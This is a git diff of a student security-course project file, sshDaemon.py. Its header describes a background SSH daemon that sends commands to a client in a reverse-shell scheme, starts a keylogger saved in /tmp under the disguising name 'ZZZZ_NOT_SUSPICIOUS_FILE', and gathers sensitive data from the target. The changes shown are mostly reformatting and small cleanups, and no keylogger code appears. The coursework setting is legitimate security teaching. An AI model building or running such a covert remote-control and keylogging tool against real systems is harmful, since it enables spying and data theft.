@@ -1,54 +1,54 @@
 #!/usr/bin/python3
 
-#==============================================================================
- #      Assignment:  DPI912 Term Project
- #      File: SSH Client
- #
- #      Authors: Sang Min Park, Jacky Tea
- #      Student ID (Sang Min Park): 124218173
- #      Student ID (Jacky Tea): 152078168
- #      Language: Python3
- #      Libraries Used: paramiko, socket, os, time, logzero,
- #      threading, subprocess, sys, atexit, signal
- #
- #      To compile with python3 >>> python3 sshDaemon.py -status start
- #      To compile with executable >>> chmod 700 sshDaemon.py 
- #                                 >>> ./sshDaemon.py -status start
- #
- #      Class: DPI912 NSB - Python for Programmers: Sockets and Security 
- #      Professor: Professor Harvey Kaduri
- #      Due Date: Friday, December 6, 2019, 5:50 PM EST
- #      Submitted:  
- #
- #-----------------------------------------------------------------------------
- #
- #      Cookbook code utilized from the following source:
- #      https://github.com/dabeaz/python-cookbook/blob/master/src/12/launching_a_daemon_process_on_unix/daemon.py
- #
- #      Description: A daemonized SSH server that runs in the background and sends commands
- #      for an awaiting client over SSH to execute via a reverse-shell scheme.
- #
- #      Input:  A command line argument of either '-status start' or '-status stop'. For example:
- #      ./sshDaemon.py -status start. '-status start' will execute the key logger, ' -status stop' will 
- #      kill its background process.
- #
- #      Output: A file called in 'sshDaemon.log' in the current directory containing
- #      error messages and information such as received messages over the SSH connection.
- #      A file called ZZZZ_NOT_SUSPICIOUS_FILE is generated in /tmp which holds the keylogger
- #      program. A file called '/tmp/sshDaemon.pid' is generated to keep track of the running process.
- #
- #      Algorithm: Once a status is received, the daemon checks if there is the existence
- #      of a pid file to see if the daemon instance is already running. If there is one, an
- #      error is thrown, else the daemonization process of double forking and flushing stdin,
- #      stdout, stderr and keeping track of the current pid before terminal control is relinquished 
- #      is done. Command are sent via SSH in the background to a SSH client to execute and gather
- #      sensitive data from the target end.
- #
- #      Required Features Not Included:  
- #
- #      Known Bugs:  
- #
-#==============================================================================
+# ==============================================================================
+#      Assignment:  DPI912 Term Project
+#      File: SSH Client
+#
+#      Authors: Sang Min Park, Jacky Tea
+#      Student ID (Sang Min Park): 124218173
+#      Student ID (Jacky Tea): 152078168
+#      Language: Python3
+#      Libraries Used: paramiko, socket, os, time, logzero,
+#      threading, subprocess, sys, atexit, signal
+#
+#      To compile with python3 >>> python3 sshDaemon.py -status start
+#      To compile with executable >>> chmod 700 sshDaemon.py
+#                                 >>> ./sshDaemon.py -status start
+#
+#      Class: DPI912 NSB - Python for Programmers: Sockets and Security
+#      Professor: Professor Harvey Kaduri
+#      Due Date: Friday, December 6, 2019, 5:50 PM EST
+#      Submitted:
+#
+# -----------------------------------------------------------------------------
+#
+#      Cookbook code utilized from the following source:
+#      https://github.com/dabeaz/python-cookbook/blob/master/src/12/launching_a_daemon_process_on_unix/daemon.py
+#
+#      Description: A daemonized SSH server that runs in the background and sends commands
+#      for an awaiting client over SSH to execute via a reverse-shell scheme.
+#
+#      Input:  A command line argument of either '-status start' or '-status stop'. For example:
+#      ./sshDaemon.py -status start. '-status start' will execute the key logger, ' -status stop' will
+#      kill its background process.
+#
+#      Output: A file called in 'sshDaemon.log' in the current directory containing
+#      error messages and information such as received messages over the SSH connection.
+#      A file called ZZZZ_NOT_SUSPICIOUS_FILE is generated in /tmp which holds the keylogger
+#      program. A file called '/tmp/sshDaemon.pid' is generated to keep track of the running process.
+#
+#      Algorithm: Once a status is received, the daemon checks if there is the existence
+#      of a pid file to see if the daemon instance is already running. If there is one, an
+#      error is thrown, else the daemonization process of double forking and flushing stdin,
+#      stdout, stderr and keeping track of the current pid before terminal control is relinquished
+#      is done. Command are sent via SSH in the background to a SSH client to execute and gather
+#      sensitive data from the target end.
+#
+#      Required Features Not Included:
+#
+#      Known Bugs:
+#
+# ==============================================================================
 
 import os
 import errno
@@ -66,10 +66,6 @@ from logzero import logger
 
 # Maximum queue size for the server to handle incoming client
 requestQueueSize = 1024
-# Size of the header that will be attached to all data packets
-headersize = 10
-# Delimiter that is used to append in between data packets
-delimiter = "&&"
 # Pathway of pidfile that will contain the pid of double-forked daemon
 pidfile = "/tmp/daemonServer.pid"
 # host key for an SSH connection
@@ -77,7 +73,6 @@ host_key = paramiko.RSAKey(filename="test_rsa.key")
 
 
 def grimReaper(signum,  frame):
-    # TODO: remove function and try running the program without it
     """Harvests child processes that have sent a signal. Ensures no zombies"""
     while True:
         try:
@@ -116,6 +111,7 @@ def parseCmdArgument():
 
 
 def removePidProcess():
+    """Removes pid process stored in the designated pidfile"""
     if os.path.exists(pidfile):
         logger.info("Server process killed...\n")
         with open(pidfile) as file:
@@ -381,11 +377,8 @@ if __name__ == '__main__':
     # Parse command line arguments
     commandArgs = parseCmdArgument()
 
-    if os.path.exists("/home/lab/bin/py/project/sshDaemon.log"):
-        os.remove("/home/lab/bin/py/project/sshDaemon.log")
-
     # Add logging to logfile and disable output to the terminal
-    logzero.logfile("/home/lab/bin/py/project/sshDaemon.log", maxBytes=1e6,
+    logzero.logfile("/tmp/sshDaemon.log", maxBytes=1e6,
                     backupCount=3, disableStderrLogger=True)
 
     # Start server process
